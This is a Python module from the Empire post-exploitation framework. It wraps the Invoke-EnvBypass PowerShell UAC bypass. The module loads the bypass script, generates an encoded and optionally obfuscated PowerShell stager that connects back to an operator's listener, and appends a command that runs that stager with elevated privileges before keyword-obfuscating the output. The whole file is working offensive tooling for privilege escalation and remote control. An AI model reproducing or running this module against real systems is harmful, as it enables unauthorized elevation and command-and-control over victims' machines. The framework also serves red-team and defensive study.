from __future__ import print_function

from builtins import str
from builtins import object

from empire.server.utils import data_util
from empire.server.common import helpers
from typing import Dict
import re
import base64

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-EnvBypass.ps1"

        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate,
                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent, proxy=proxy,
                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])
            enc_script = launcher.split(" ")[-1]
            if launcher == "":
                print(helpers.color("[!] Error in launcher generation."))
                return ""
            else:
                script += "Invoke-EnvBypass -Command \"%s\"" % (enc_script)
                script = data_util.keyword_obfuscation(script)
                return script
